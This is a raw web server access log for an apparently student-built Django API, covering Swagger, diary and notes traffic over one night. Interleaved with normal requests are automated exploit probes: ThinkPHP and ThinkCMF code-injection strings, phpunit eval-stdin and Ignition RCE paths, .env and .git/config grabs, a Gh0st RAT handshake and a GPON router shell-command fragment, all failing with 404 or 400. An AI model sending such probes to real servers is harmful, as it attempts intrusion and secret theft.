221.145.194.16 - - [25/Mar/2021:16:03:02 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-standalone-preset.js HTTP/1.1" 200 329649 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:03:02 +0000] "GET /static/drf-yasg/swagger-ui-init.js HTTP/1.1" 200 14715 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:03:02 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-bundle.js HTTP/1.1" 200 1038857 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:03:02 +0000] "GET /static/drf-yasg/swagger-ui-dist/favicon-32x32.png HTTP/1.1" 200 628 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:03:02 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
23.22.16.221 - - [25/Mar/2021:16:03:03 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "-" "swagger-validator"
221.145.194.16 - - [25/Mar/2021:16:03:10 +0000] "POST /ai/grammarcheck/ HTTP/1.1" 401 58 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:07:02 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 500 88120 "-" "PostmanRuntime/7.26.10"
221.145.194.16 - - [25/Mar/2021:16:07:06 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 129498 "-" "okhttp/3.12.12"
175.203.81.8 - - [25/Mar/2021:16:07:16 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 500 88084 "-" "PostmanRuntime/7.26.10"
119.203.225.186 - - [25/Mar/2021:16:07:29 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
211.117.24.132 - - [25/Mar/2021:16:07:32 +0000] "GET / HTTP/1.1" 404 1090 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:07:35 +0000] "GET /redoc HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:07:35 +0000] "GET /redoc/ HTTP/1.1" 200 487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:07:35 +0000] "GET /static/drf-yasg/redoc-init.js HTTP/1.1" 200 2322 "http://j4b105.p.ssafy.io/redoc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:07:35 +0000] "GET /static/drf-yasg/redoc/redoc.min.js HTTP/1.1" 200 925768 "http://j4b105.p.ssafy.io/redoc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:07:35 +0000] "GET /redoc/?format=openapi HTTP/1.1" 200 5516 "http://j4b105.p.ssafy.io/redoc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:07:35 +0000] "GET /static/drf-yasg/redoc/redoc-logo.png HTTP/1.1" 200 4969 "http://j4b105.p.ssafy.io/redoc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:08:12 +0000] "GET /media/2021/03/25/%EB%A7%88%EB%8A%98%EC%9D%B4_xIbRNxk.jpg HTTP/1.1" 404 1180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:08:12 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/media/2021/03/25/%EB%A7%88%EB%8A%98%EC%9D%B4_xIbRNxk.jpg" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:08:25 +0000] "GET /media/ HTTP/1.1" 404 1104 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:08:27 +0000] "GET /media/2021/03/25/%EB%A7%88%EB%8A%98%EC%9D%B4_xIbRNxk.jpg HTTP/1.1" 404 1180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:08:39 +0000] "GET /media/images/2021/03/25/KakaoTalk_20210206_171410711.png HTTP/1.1" 404 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
194.223.186.122 - - [25/Mar/2021:16:11:24 +0000] "GET / HTTP/1.1" 404 2894 "-" "-"
175.203.81.8 - - [25/Mar/2021:16:12:31 +0000] "GET /static/images/2021/03/25/KakaoTalk_20210206_171410711.png HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:16:52 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:17:00 +0000] "GET /static HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:17:00 +0000] "GET /static/ HTTP/1.1" 403 187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:17:10 +0000] "GET /ai HTTP/1.1" 404 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:23:45 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:24:03 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 129498 "-" "okhttp/3.12.12"
221.145.194.16 - - [25/Mar/2021:16:25:13 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 129498 "-" "okhttp/3.12.12"
175.203.81.8 - - [25/Mar/2021:16:27:33 +0000] "GET /media/images/2021/03/25/KakaoTalk_20210206_171410711.png HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:27:37 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:27:38 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:16:27:38 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:27:45 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 99 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [25/Mar/2021:16:28:02 +0000] "GET /media/images/2021/03/25/%EB%A1%9C%EB%98%90_8Xdv8jR.jpg HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:28:09 +0000] "GET /static/images/2021/03/25/%EB%A1%9C%EB%98%90_8Xdv8jR.jpg HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:28:22 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 99 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [25/Mar/2021:16:28:27 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 99 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [25/Mar/2021:16:28:32 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 500 88084 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [25/Mar/2021:16:29:02 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 99 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [25/Mar/2021:16:29:28 +0000] "GET /images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84.jpg HTTP/1.1" 404 1170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:29:32 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84.jpg HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:29:59 +0000] "GET /static/test.txt HTTP/1.1" 200 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:30:33 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84.jpg HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:30:38 +0000] "GET /media/images/2021/03/25/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [25/Mar/2021:16:30:41 +0000] "GET /media/images/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:32:25 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /swagger/ HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /static/drf-yasg/style.css HTTP/1.1" 200 1047 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /static/drf-yasg/insQ.min.js HTTP/1.1" 200 2093 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /static/drf-yasg/immutable.min.js HTTP/1.1" 200 56904 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui.css HTTP/1.1" 200 143074 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-standalone-preset.js HTTP/1.1" 200 329649 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:20 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-bundle.js HTTP/1.1" 200 1038857 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:21 +0000] "GET /static/drf-yasg/url-polyfill.min.js HTTP/1.1" 200 6092 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:21 +0000] "GET /static/drf-yasg/swagger-ui-init.js HTTP/1.1" 200 14715 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:16:34:21 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
23.22.16.221 - - [25/Mar/2021:16:34:22 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "-" "swagger-validator"
1.245.233.122 - - [25/Mar/2021:16:34:41 +0000] "GET /notes/ HTTP/1.1" 401 58 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
139.162.119.197 - - [25/Mar/2021:16:58:19 +0000] "GET / HTTP/1.1" 404 2894 "-" "HTTP Banner Detection (https://security.ipip.net)"
221.145.194.16 - - [25/Mar/2021:16:58:30 +0000] "POST /accounts/check/email/ HTTP/1.1" 500 129526 "-" "okhttp/3.12.12"
221.145.194.16 - - [25/Mar/2021:17:04:41 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:17:04:41 +0000] "GET /favicon.ico HTTP/1.1" 404 1108 "http://j4b105.p.ssafy.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:17:04:46 +0000] "GET /swagger/ HTTP/1.1" 200 895 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:17:04:47 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
23.22.16.221 - - [25/Mar/2021:17:04:48 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "-" "swagger-validator"
45.146.165.157 - - [25/Mar/2021:18:12:11 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 1116 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:11 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 1135 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:12 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 1120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:12 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 1187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:12 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 1128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:12 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 1117 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:13 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 1116 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:13 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 1135 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:14 +0000] "GET /console/ HTTP/1.1" 404 1106 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:14 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [25/Mar/2021:18:12:14 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 1121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:18:21:19 +0000] "GET /swagger/ HTTP/1.1" 200 893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:18:21:20 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:18:21:20 +0000] "GET /static/drf-yasg/swagger-ui-dist/favicon-32x32.png HTTP/1.1" 200 628 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
23.22.16.221 - - [25/Mar/2021:18:21:21 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 5516 "-" "swagger-validator"
221.145.194.16 - - [25/Mar/2021:18:21:27 +0000] "GET / HTTP/1.1" 404 1090 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:18:21:34 +0000] "GET /ai HTTP/1.1" 404 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:18:21:39 +0000] "GET /ai/ HTTP/1.1" 404 1135 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [25/Mar/2021:18:26:22 +0000] "GET /ai/ HTTP/1.1" 404 1149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
1.245.233.122 - - [25/Mar/2021:18:56:52 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
1.245.233.122 - - [25/Mar/2021:18:57:47 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
66.240.205.34 - - [25/Mar/2021:19:01:27 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 157 "-" "-"
1.245.233.122 - - [25/Mar/2021:19:03:32 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
1.245.233.122 - - [25/Mar/2021:19:04:21 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
185.153.196.198 - - [25/Mar/2021:21:31:37 +0000] "GET /.git/config HTTP/1.1" 404 1105 "-" "python-requests/2.24.0"
103.145.13.24 - - [25/Mar/2021:22:02:07 +0000] "GET / HTTP/1.0" 404 2894 "-" "-"
88.5.237.10 - - [25/Mar/2021:22:12:25 +0000] "GET / HTTP/1.1" 404 1088 "-" "Mozilla/5.0 zgrab/0.x"
54.209.26.126 - - [25/Mar/2021:22:57:36 +0000] "GET /.env HTTP/1.1" 404 1100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.209.26.126 - - [25/Mar/2021:22:57:39 +0000] "POST / HTTP/1.1" 404 1089 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.55 - - [25/Mar/2021:23:03:13 +0000] "GET / HTTP/1.1" 404 2897 "-" "-"
162.142.125.55 - - [25/Mar/2021:23:03:14 +0000] "GET / HTTP/1.1" 404 1088 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
123.206.99.229 - - [26/Mar/2021:00:05:06 +0000] "GET /.env HTTP/1.1" 404 1100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
123.206.99.229 - - [26/Mar/2021:00:05:07 +0000] "POST / HTTP/1.1" 404 1089 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.255.167.163 - - [26/Mar/2021:00:09:37 +0000] "GET / HTTP/1.1" 404 2894 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
52.255.167.163 - - [26/Mar/2021:00:09:38 +0000] "GET /admin/index.php HTTP/1.1" 400 559 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
205.185.122.102 - - [26/Mar/2021:00:15:45 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1116 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
116.68.96.107 - - [26/Mar/2021:00:48:06 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1120 "-" "Hello, World"
116.68.96.107 - - [26/Mar/2021:00:48:09 +0000] "sh+/tmp/gpon80&ipv=0" 400 157 "-" "-"
3.142.120.98 - - [26/Mar/2021:01:05:02 +0000] "GET / HTTP/1.1" 404 1088 "-" "python-requests/2.24.0"
221.145.194.16 - - [26/Mar/2021:01:16:36 +0000] "GET /swagger/ HTTP/1.1" 200 895 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/style.css HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui.css HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-bundle.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
221.145.194.16 - - [26/Mar/2021:01:16:37 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-standalone-preset.js HTTP/1.1" 304 0 "http://j4b105.p.ssafy.io/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
